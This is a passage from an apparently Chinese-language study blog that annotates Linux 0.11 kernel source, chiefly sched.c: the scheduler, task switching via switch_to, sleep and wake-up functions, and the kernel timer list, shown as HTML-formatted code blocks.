+= DAY*(tm-&gt;tm_mday<span class="number">-1</span>);<span class="comment">// 加上当前月份(已过的天数-1)的总秒数</span></span><br><span class="line">res += HOUR*tm-&gt;tm_hour;<span class="comment">// 加上当前小时的秒数</span></span><br><span class="line">res += MINUTE*tm-&gt;tm_min;<span class="comment">// 加上当前分钟的秒数</span></span><br><span class="line">res += tm-&gt;tm_sec;<span class="comment">// 加上当前的秒数</span></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="sched-c"><a href="#sched-c" class="headerlink" title="sched.c"></a>sched.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sys.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fdreg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/system.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/segment.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span><span class="comment">// 包含一些头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _S(nr) (1&lt;&lt;((nr)-1))<span class="comment">// 取信号 nr 在信号位图中对应位的二进制数值，n 的范围是 1 ~ 32</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BLOCKABLE (~(_S(SIGKILL) | _S(SIGSTOP))) <span class="comment">// 除了 SIGKILL 与 SIGSTOP 外的信号都是可阻塞的</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_task</span><span class="params">(<span class="keyword">int</span> nr,struct task_struct * p)</span><span class="comment">// 内核调试函数，nr 表示任务号，p 是任务结构指针</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j = <span class="number">4096</span>-<span class="keyword">sizeof</span>(struct task_struct);<span class="comment">// j 表示内核栈最大容量及最低顶端位置</span></span><br><span class="line"></span><br><span class="line">printk(<span class="string">&quot;%d: pid=%d, state=%d, &quot;</span>,nr,p-&gt;pid,p-&gt;state);<span class="comment">// 输出任务号 nr 的进程号及进程状态</span></span><br><span class="line">i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i&lt;j &amp;&amp; !((<span class="keyword">char</span> *)(p+<span class="number">1</span>))[i])<span class="comment">// 检测任务数据结构后为空的空闲字节并输出</span></span><br><span class="line">i++;</span><br><span class="line">printk(<span class="string">&quot;%d (of %d) chars free in kernel stack\n\r&quot;</span>,i,j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_stat</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">// 显示所有任务的状态信息</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;NR_TASKS;i++)<span class="comment">// 遍历任务数组，R_TASKS 为 64，定义在 include/linux/sched.h</span></span><br><span class="line"><span class="keyword">if</span> (task[i])</span><br><span class="line">show_task(i,task[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LATCH (1193180/HZ)<span class="comment">// 8253 计数/定时芯片的初值，HZ 为 100</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">mem_use</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 未在其它地方定义及使用过</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">timer_interrupt</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 引用 timer_interrupt 及 system_call 子程序</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">system_call</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">task_union</span> &#123;</span><span class="comment">// 定义任务的内核态堆栈结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">task</span>;</span></span><br><span class="line"><span class="keyword">char</span> <span class="built_in">stack</span>[PAGE_SIZE];<span class="comment">// PAGE_SIZE 值为 4096，定义在 include/linux/mm.h</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">union</span> <span class="title">task_union</span> <span class="title">init_task</span> =</span> &#123;INIT_TASK,&#125;;<span class="comment">// 定义初始任务</span></span><br><span class="line"><span class="comment">// INIT_TASK 在 include/linux/sched.h</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">volatile</span> jiffies=<span class="number">0</span>;<span class="comment">// 该变量用于计数经过了多少个时钟中断，称为时钟滴答数</span></span><br><span class="line"><span class="keyword">long</span> startup_time=<span class="number">0</span>;<span class="comment">// 开机时间</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">current</span> =</span> &amp;(init_task.task);<span class="comment">// 当前任务的任务结构体指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">last_task_used_math</span> =</span> <span class="literal">NULL</span>;<span class="comment">// 使用过协处理器任务的指针</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">task</span>[<span class="title">NR_TASKS</span>] =</span> &#123;&amp;(init_task.task), &#125;;<span class="comment">// 所有任务的任务结构体数组</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">long</span> user_stack [ PAGE_SIZE&gt;&gt;<span class="number">2</span> ] ;<span class="comment">// 设置用户栈，大小为 4K 字节</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">// 设置 ss:esp（0x10 是内核选择符，esp指向用户栈的末尾）</span></span><br><span class="line"><span class="keyword">long</span> * a;</span><br><span class="line"><span class="keyword">short</span> b;</span><br><span class="line">&#125; stack_start = &#123; &amp; user_stack [PAGE_SIZE&gt;&gt;<span class="number">2</span>] , <span class="number">0x10</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数用于在任务调度时将旧任务的协处理器状态保存，并还原当前任务的协处理器状态</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">math_state_restore</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (last_task_used_math == current)<span class="comment">// 如果选择出来的任务和上次一样，则不作处理</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">__asm__(<span class="string">&quot;fwait&quot;</span>);<span class="comment">// 保存状态前需要先执行 fwait 指令</span></span><br><span class="line"><span class="keyword">if</span> (last_task_used_math) &#123;<span class="comment">// 如果上一个任务使用了协处理器，则将其状态保存在相应 tss 字段中</span></span><br><span class="line">__asm__(<span class="string">&quot;fnsave %0&quot;</span>::<span class="string">&quot;m&quot;</span> (last_task_used_math-&gt;tss.i387));</span><br><span class="line">&#125;</span><br><span class="line">last_task_used_math=current;<span class="comment">// 上一个使用协处理器的任务就指向了当前任务</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;used_math) &#123;<span class="comment">// 如果当前任务使用过协处理器，则恢复其状态</span></span><br><span class="line">__asm__(<span class="string">&quot;frstor %0&quot;</span>::<span class="string">&quot;m&quot;</span> (current-&gt;tss.i387));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">// 否则初始化协处理器，并将 used_math 字段置 1</span></span><br><span class="line">__asm__(<span class="string">&quot;fninit&quot;</span>::);</span><br><span class="line">current-&gt;used_math=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是进程调度函数，schedule 会选出 counter 值最大的任务作为 next 任务来运行。如果系统中只有 0 号进程在运行时，则切换到 0 号进程，其又执行 pause 来调用 schedule 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 104</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,next,c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 该循环检测 alarm，唤醒已经得到信号的可中断任务</span></span><br><span class="line"><span class="comment">// 从任务数组的最后一个任务开始往前遍历</span></span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p) &#123;<span class="comment">// 跳过空指针</span></span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;alarm &amp;&amp; (*p)-&gt;alarm &lt; jiffies) &#123;<span class="comment">// 如果设置过任务 alarm 值且已经过期</span></span><br><span class="line">(*p)-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGALRM<span class="number">-1</span>));<span class="comment">// 就向任务发送 SIGALRM 信号</span></span><br><span class="line">(*p)-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果信号位图中除被阻塞的信号外还有其他信号，并且任务处于可中断状态</span></span><br><span class="line"><span class="keyword">if</span> (((*p)-&gt;signal &amp; ~(_BLOCKABLE &amp; (*p)-&gt;blocked)) &amp;&amp;</span><br><span class="line">(*p)-&gt;state==TASK_INTERRUPTIBLE)</span><br><span class="line">(*p)-&gt;state=TASK_RUNNING;<span class="comment">// 则将任务设置为就绪态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面这个循环是调度程序的主要部分，同样从任务数组的最后一个任务开始遍历</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">c = <span class="number">-1</span>;</span><br><span class="line">next = <span class="number">0</span>;</span><br><span class="line">i = NR_TASKS;</span><br><span class="line">p = &amp;task[NR_TASKS];</span><br><span class="line"><span class="keyword">while</span> (--i) &#123;</span><br><span class="line"><span class="keyword">if</span> (!*--p)<span class="comment">// 跳过空指针</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">// 从数组中选出 counter 值最大的任务</span></span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c)</span><br><span class="line">c = (*p)-&gt;counter, next = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c) <span class="keyword">break</span>;<span class="comment">// 如果选出来了或者系统中没有可运行的任务就退出循环</span></span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p)<span class="comment">// 否则就根据每个任务的 priority 更新 counter 值</span></span><br><span class="line">(*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) +</span><br><span class="line">(*p)-&gt;priority;</span><br><span class="line">&#125;</span><br><span class="line">switch_to(next);<span class="comment">// 调用 switch_to 函数切换任务</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>switch_to 定义在 include/linux/sched.h，_TSS 也定义在该文件中。</p><p>ljmp 长跳转的指令格式为：ljmp 16 位段选择子：32 位偏移值，这里定义的 _tmp.a 就是 32 位偏移值，_tmp.b 低 2 字节是 16 位段选择子（高 2 字节不用）。跳转到 TSS 描述符的选择子会导致任务切换到该 TSS 对应的进程，且对于造成任务切换的长跳转 _tmp.a 的值无用，因此这里没有对 _tmp.a 进行赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/linux/sched.h Line 171</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> switch_to(n) &#123;\<span class="comment">// n 为选择出来的任务在任务数组中的索引</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="keyword">long</span> a,b;&#125; __tmp; \</span><br><span class="line">__asm__(<span class="string">&quot;cmpl %%ecx,current\n\t&quot;</span> \<span class="comment">// 判断选出的任务是否就是当前任务</span></span><br><span class="line"><span class="string">&quot;je 1f\n\t&quot;</span> \<span class="comment">// 如果是，则什么都不做</span></span><br><span class="line"><span class="string">&quot;movw %%dx,%1\n\t&quot;</span> \<span class="comment">// 否则将新任务的 TSS 选择子存入 __tmp.b 中</span></span><br><span class="line"><span class="string">&quot;xchgl %%ecx,current\n\t&quot;</span> \<span class="comment">// current 指向新任务，ecx 指向旧任务</span></span><br><span class="line"><span class="string">&quot;ljmp *%0\n\t&quot;</span> \<span class="comment">// 长跳转至 TSS 选择子导致任务切换，以下代码在切换回来后执行</span></span><br><span class="line"><span class="string">&quot;cmpl %%ecx,last_task_used_math\n\t&quot;</span> \ <span class="comment">// 判断原任务上次是否使用过协处理器</span></span><br><span class="line"><span class="string">&quot;jne 1f\n\t&quot;</span> \<span class="comment">// 如果没有则返回</span></span><br><span class="line"><span class="string">&quot;clts\n&quot;</span> \<span class="comment">// 否则清除 CR0 中的 TS 位</span></span><br><span class="line"><span class="string">&quot;1:&quot;</span> \</span><br><span class="line">::<span class="string">&quot;m&quot;</span> (*&amp;__tmp.a),<span class="string">&quot;m&quot;</span> (*&amp;__tmp.b), \</span><br><span class="line"><span class="comment">// 新任务的 TSS 描述符的选择子放在 dx 中，任务结构体指针放在 ecx 中</span></span><br><span class="line"><span class="string">&quot;d&quot;</span> (_TSS(n)),<span class="string">&quot;c&quot;</span> ((<span class="keyword">long</span>) task[n])); \</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 155</span></span><br><span class="line"><span class="comment">// 计算 GDT 中第 n 个任务的 TSS 描述符的选择子，FIRST_TSS_ENTRY 值为 4，</span></span><br><span class="line"><span class="comment">// 因为每个描述符 8 字节，左移三位表示 FIRST_TSS 描述符在 GDT 中的起始偏移地址，</span></span><br><span class="line"><span class="comment">// 每个任务需要一个 TSS 描述符与一个 LDT 描述符，共 16 字节，故 n 要左移 4 位</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSS(n) ((((unsigned long) n)&lt;&lt;4)+(FIRST_TSS_ENTRY&lt;&lt;3))</span></span><br></pre></td></tr></table></figure><p>继续看 sched.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 144</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_pause</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">// 导致进程进入睡眠状态直到接收到一个信号</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">current-&gt;state = TASK_INTERRUPTIBLE;<span class="comment">// 将当前任务状态切换为可中断的等待状态</span></span><br><span class="line">schedule();<span class="comment">// 重新执行调度函数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sleep_on</span><span class="params">(struct task_struct **p)</span><span class="comment">// 将当前任务置为不可中断的睡眠状态（需要 wake_up 唤醒）</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">// p 是等待任务队列的头指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)<span class="comment">// 为空指针则返回</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))<span class="comment">// 0 号进程不可以进入该状态</span></span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">tmp = *p;<span class="comment">// tmp 指向已经在等待队列上的任务</span></span><br><span class="line">*p = current;<span class="comment">// 等待队列头指针指向当前任务</span></span><br><span class="line">current-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">schedule();<span class="comment">// 重新调度</span></span><br><span class="line"><span class="keyword">if</span> (tmp)<span class="comment">// 当原进程被 wake_up 函数唤醒才会执行此处代码</span></span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;<span class="comment">// 如果早期进入队列的任务没有被唤醒，将其状态置为就绪态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interruptible_sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">// 将当前任务置为可中断的睡眠状态，可通过信号、任务超时等手段唤醒</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">tmp=*p;</span><br><span class="line">*p=current;</span><br><span class="line">repeat:current-&gt;state = TASK_INTERRUPTIBLE;<span class="comment">// 将当前任务置为可中断的睡眠状态</span></span><br><span class="line">schedule();<span class="comment">// 重新调度</span></span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; *p != current) &#123;<span class="comment">// 原任务被唤醒时，若头指针指向的任务不是当前任务，</span></span><br><span class="line">(**p).state=<span class="number">0</span>;<span class="comment">// 说明本任务之后还有任务进入队列，需要将它们都唤醒</span></span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line">&#125;</span><br><span class="line">*p=<span class="literal">NULL</span>;<span class="comment">// 对于最先进入队列的任务，最终会将头指针置为空</span></span><br><span class="line"><span class="keyword">if</span> (tmp)</span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up</span><span class="params">(struct task_struct **p)</span><span class="comment">// 唤醒不可中断等待任务</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p &amp;&amp; *p) &#123;<span class="comment">// 如果两个指针都非空</span></span><br><span class="line">(**p).state=<span class="number">0</span>;<span class="comment">// 将任务置位就绪态</span></span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 201 行到 262 行的几个函数用于软驱定时处理，等看到块设备部分再记录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 264</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIME_REQUESTS 64<span class="comment">// 定义最多有 64 个内核定时器</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span><span class="comment">// 定时器链表的结构及定时器链表数组</span></span><br><span class="line"><span class="keyword">long</span> jiffies;<span class="comment">// 滴答数</span></span><br><span class="line"><span class="keyword">void</span> (*fn)();<span class="comment">// 定时处理程序指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> * <span class="title">next</span>;</span><span class="comment">// next 指针</span></span><br><span class="line">&#125; timer_list[TIME_REQUESTS], * next_timer = <span class="literal">NULL</span>;<span class="comment">// next_timer 为定时器队列的头指针</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_timer</span><span class="params">(<span class="keyword">long</span> jiffies, <span class="keyword">void</span> (*fn)(<span class="keyword">void</span>))</span><span class="comment">// 添加定时器</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> * <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fn)<span class="comment">// 如果定时处理程序指针为空，则返回</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">cli();<span class="comment">// 关闭外中断</span></span><br><span class="line"><span class="keyword">if</span> (jiffies &lt;= <span class="number">0</span>)<span class="comment">// 如果定时值小于 0，则立即执行处理程序，并且定时器不加入链表</span></span><br><span class="line">(fn)();</span><br><span class="line"><span class="keyword">else</span> &#123;<span class="comment">// 否则从数组中取空闲项</span></span><br><span class="line"><span class="keyword">for</span> (p = timer_list ; p &lt; timer_list + TIME_REQUESTS ; p++)</span><br><span class="line"><span class="keyword">if</span> (!p-&gt;fn)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (p &gt;= timer_list + TIME_REQUESTS)<span class="comment">// 如果没有空闲项，系统 GG</span></span><br><span class="line">panic(<span class="string">&quot;No more time requests free&quot;</span>);</span><br><span class="line">p-&gt;fn = fn;</span><br><span class="line">p-&gt;jiffies = jiffies;<span class="comment">// 给结构体赋值</span></span><br><span class="line">p-&gt;next = next_timer;</span><br><span class="line">next_timer = p;<span class="comment">// 链入表头</span></span><br><span class="line"><span class="keyword">while</span> (p-&gt;next &amp;&amp; p-&gt;next-&gt;jiffies &lt; p-&gt;jiffies) &#123;<span class="comment">// 将该定时器插入链表中的适当位置</span></span><br><span class="line">p-&gt;jiffies -= p-&gt;next-&gt;jiffies;<span class="comment">// （从小到大），减去前面需要的滴答数</span></span><br><span class="line">fn = p-&gt;fn;<span class="comment">// 这样处理定时器时只需要看表头第一项是否到期</span></span><br><span class="line">p-&gt;fn = p-&gt;next-&gt;fn;</span><br><span class="line">p-&gt;next-&gt;fn = fn;</span><br><span class="line">jiffies = p-&gt;jiffies;</span><br><span class="line">p-&gt;jiffies = p-&gt;next-&gt;jiffies;</span><br><span 